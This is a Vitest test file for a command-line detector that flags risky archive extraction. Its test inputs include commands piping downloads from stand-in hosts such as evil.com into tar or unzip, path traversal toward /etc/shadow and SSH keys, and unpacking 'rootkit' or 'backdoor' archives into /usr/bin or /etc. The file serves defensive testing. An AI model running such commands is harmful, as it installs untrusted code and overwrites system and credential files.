import { describe, it, expect } from 'vitest';
import { detectArchiveBomb } from '../archive-bomb';

describe('detectArchiveBomb', () => {
  describe('untrusted archive extraction', () => {
    it('should detect curl | tar extract', async () => {
      const result = await detectArchiveBomb({
        command: 'curl https://example.com/archive.tar.gz | tar xzf -',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.detector).toBe('archive-bomb');
      expect(result?.message).toContain('untrusted source');
    });

    it('should detect wget | tar extract', async () => {
      const result = await detectArchiveBomb({
        command: 'wget -O- https://evil.com/malware.tar | tar xf -',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl | unzip', async () => {
      const result = await detectArchiveBomb({
        command: 'curl https://attacker.com/archive.zip | unzip -',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wget | 7z extract', async () => {
      const result = await detectArchiveBomb({
        command: 'wget -O- https://malicious.com/file.7z | 7z x',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect tar extract with URL', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf https://example.com/archive.tar.gz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect unzip with URL', async () => {
      const result = await detectArchiveBomb({
        command: 'unzip https://evil.com/bomb.zip',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('path traversal patterns', () => {
    it('should detect multiple ../ sequences', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf archive.tar.gz ../../../etc/passwd',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('path traversal');
    });

    it('should detect path traversal to /etc/passwd', async () => {
      const result = await detectArchiveBomb({
        command: 'unzip malicious.zip ../../etc/passwd',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect path traversal to /etc/shadow', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xf evil.tar ../../../etc/shadow',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect path traversal to /root', async () => {
      const result = await detectArchiveBomb({
        command: '7z x archive.7z ../../../../root/.ssh/id_rsa',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect backslash path traversal (Windows style)', async () => {
      const result = await detectArchiveBomb({
        command: 'unzip archive.zip ..\\..\\windows\\system32',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect tar with path traversal to /etc', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf archive.tar.gz ../../etc/hosts',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('path traversal');
    });
  });

  describe('extracting to sensitive locations', () => {
    it('should detect tar -C /etc', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf archive.tar.gz -C /etc',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('sensitive'); // More flexible check
    });

    it('should detect tar --directory /usr/bin', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xf malicious.tar --directory /usr/bin',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect unzip -d /usr/local/bin', async () => {
      const result = await detectArchiveBomb({
        command: 'unzip archive.zip -d /usr/local/bin',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect cd /etc && tar extract', async () => {
      const result = await detectArchiveBomb({
        command: 'cd /etc && tar xzf /tmp/archive.tar.gz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect tar extract to /bin', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xf backdoor.tar -C /bin',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect tar extract to /sbin', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xvf malware.tar --directory=/sbin',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect extraction to /root directory', async () => {
      const result = await detectArchiveBomb({
        command: 'cd /root && unzip evil.zip',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('piped extraction from curl/wget', () => {
    it('should detect curl https://... | tar xz', async () => {
      const result = await detectArchiveBomb({
        command: 'curl https://evil.com/bomb.tar.gz | tar xz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('untrusted source');
    });

    it('should detect wget -O- | tar extract', async () => {
      const result = await detectArchiveBomb({
        command: 'wget -O- https://attacker.com/archive.tar | tar x',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl | unzip -', async () => {
      const result = await detectArchiveBomb({
        command: 'curl https://example.com/file.zip | unzip -',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect complex pipe: curl -s | gunzip | tar x', async () => {
      const result = await detectArchiveBomb({
        command: 'curl -s https://evil.com/data.tar.gz | gunzip | tar x',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('missing safety flags', () => {
    it('should detect tar extract without --no-same-owner', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf untrusted.tar.gz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
      expect(result?.message).toContain('--no-same-owner');
    });

    it('should detect tar xf without safety flags from network', async () => {
      const result = await detectArchiveBomb({
        command: 'curl https://example.com/file.tar | tar xf -',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high'); // Higher severity for network source
    });

    it('should detect tar xvf without --no-same-owner', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xvf archive.tar',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
      expect(result?.message).toContain('--no-same-owner');
    });
  });

  describe('recursive extraction patterns', () => {
    it('should detect find + xargs tar extraction', async () => {
      const result = await detectArchiveBomb({
        command: 'find . -name "*.tar.gz" | xargs tar xzf',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('recursive');
    });

    it('should detect for loop extracting archives', async () => {
      const result = await detectArchiveBomb({
        command: 'for f in *.zip; do unzip $f; done',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wildcard extraction: tar xzf *.tar.gz', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf *.tar.gz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect nested extraction: tar && tar', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf outer.tar.gz && tar xzf inner.tar.gz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect find + xargs unzip pattern', async () => {
      const result = await detectArchiveBomb({
        command: 'find /tmp -name "*.zip" | xargs unzip',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('large file extraction without checks', () => {
    it('should detect curl | tar without size limit', async () => {
      const result = await detectArchiveBomb({
        command: 'curl https://example.com/huge.tar.gz | tar xz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wget | unzip without validation', async () => {
      const result = await detectArchiveBomb({
        command: 'wget -O- https://evil.com/bomb.zip | unzip',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('zip slip vulnerabilities in code', () => {
    it('should detect Python zipfile.extractall without validation', async () => {
      const result = await detectArchiveBomb({
        command: 'python3 -c "from zipfile import ZipFile; ZipFile(\'evil.zip\').extractall()"',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('zip slip');
    });

    it('should detect Python tarfile.extractall', async () => {
      const result = await detectArchiveBomb({
        command: 'python -c "import tarfile; tarfile.extractall()"',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect Java ZipInputStream.getNextEntry without validation', async () => {
      const result = await detectArchiveBomb({
        command:
          'java -jar extract.jar # contains: ZipInputStream zis = new ZipInputStream(...); zis.getNextEntry()',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect Node.js unzipper.Extract without validation', async () => {
      const result = await detectArchiveBomb({
        command: "node -e \"require('unzipper').Extract({path: '.'})\"",
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect Ruby Zip::File.open.extract', async () => {
      const result = await detectArchiveBomb({
        command: "ruby -e \"require 'zip'; Zip::File.open('file.zip').extract\"",
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect .NET ZipFile.ExtractToDirectory', async () => {
      const result = await detectArchiveBomb({
        command: 'dotnet run # contains: ZipFile.ExtractToDirectory(zipPath, extractPath)',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('safe operations - should NOT trigger', () => {
    it('should allow tar listing (read-only)', async () => {
      const result = await detectArchiveBomb({
        command: 'tar tf archive.tar.gz',
      });
      expect(result).toBeNull();
    });

    it('should allow tar -tvf (verbose list)', async () => {
      const result = await detectArchiveBomb({
        command: 'tar tvf archive.tar',
      });
      expect(result).toBeNull();
    });

    it('should allow unzip -l (list contents)', async () => {
      const result = await detectArchiveBomb({
        command: 'unzip -l archive.zip',
      });
      expect(result).toBeNull();
    });

    it('should allow 7z l (list)', async () => {
      const result = await detectArchiveBomb({
        command: '7z l archive.7z',
      });
      expect(result).toBeNull();
    });

    it('should allow tar extract from local file to current directory', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf myproject.tar.gz',
      });
      // This should trigger medium severity for missing safety flags, not high
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
    });

    it('should allow tar extract with safety flags', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf archive.tar.gz --no-same-owner --no-same-permissions',
      });
      expect(result).toBeNull();
    });

    it('should allow tar creation (not extraction)', async () => {
      const result = await detectArchiveBomb({
        command: 'tar czf backup.tar.gz ./mydir',
      });
      expect(result).toBeNull();
    });

    it('should allow zip creation', async () => {
      const result = await detectArchiveBomb({
        command: 'zip -r archive.zip mydir/',
      });
      expect(result).toBeNull();
    });

    it('should allow 7z archive creation', async () => {
      const result = await detectArchiveBomb({
        command: '7z a backup.7z files/',
      });
      expect(result).toBeNull();
    });

    it('should allow package manager operations', async () => {
      const safeCommands = [
        'apt install package',
        'yum install package',
        'npm install express',
        'pip install requests',
        'cargo install ripgrep',
      ];

      for (const command of safeCommands) {
        const result = await detectArchiveBomb({ command });
        expect(result).toBeNull();
      }
    });

    it('should allow extraction with validation', async () => {
      const result = await detectArchiveBomb({
        command: 'tar tzf archive.tar.gz | grep -v "\\.\\." && tar xzf archive.tar.gz',
      });
      expect(result).toBeNull();
    });
  });

  describe('configuration options', () => {
    it('should respect disabled config', async () => {
      const result = await detectArchiveBomb(
        {
          command: 'curl https://evil.com/bomb.tar.gz | tar xz',
        },
        { enabled: false, severity: 'high' }
      );
      expect(result).toBeNull();
    });

    it('should respect custom severity', async () => {
      const result = await detectArchiveBomb(
        {
          command: 'curl https://example.com/archive.tar | tar xf -',
        },
        { enabled: true, severity: 'medium' }
      );
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
    });

    it('should use default high severity when not specified', async () => {
      const result = await detectArchiveBomb({
        command: 'wget -O- https://evil.com/bomb.tar.gz | tar xz',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('sensitive files in archive operations', () => {
    it('should detect tar extract with sensitive file patterns', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf backup.tar.gz --no-same-owner id_rsa',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
      expect(result?.message).toContain('sensitive files');
    });

    it('should detect unzip extract with .env file', async () => {
      const result = await detectArchiveBomb({
        command: 'unzip -x archive.zip .env',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
    });

    it('should detect tar extract with SSH keys', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf backup.tar.gz ~/.ssh/id_rsa',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
    });

    it('should detect 7z extract with credentials', async () => {
      const result = await detectArchiveBomb({
        command: '7z x archive.7z credentials.json',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
    });
  });

  describe('edge cases and complex patterns', () => {
    it('should detect tar with both path traversal and missing flags', async () => {
      const result = await detectArchiveBomb({
        command: 'tar xzf malicious.tar.gz ../../../etc/hosts',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      // Path traversal is checked first, so should get that message
      expect(result?.message).toContain('path traversal');
    });

    it('should detect piped extraction to sensitive location', async () => {
      const result = await detectArchiveBomb({
        command: 'curl https://evil.com/rootkit.tar.gz | tar xz -C /usr/bin',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect multiple dangerous patterns (untrusted + sensitive location)', async () => {
      const result = await detectArchiveBomb({
        command: 'wget -O- https://attacker.com/backdoor.tar | tar x -C /etc',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should handle multiline commands', async () => {
      const result = await detectArchiveBomb({
        command: `
          curl https://evil.com/archive.tar.gz | \\
          tar xz -C /usr/local/bin
        `,
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });
});
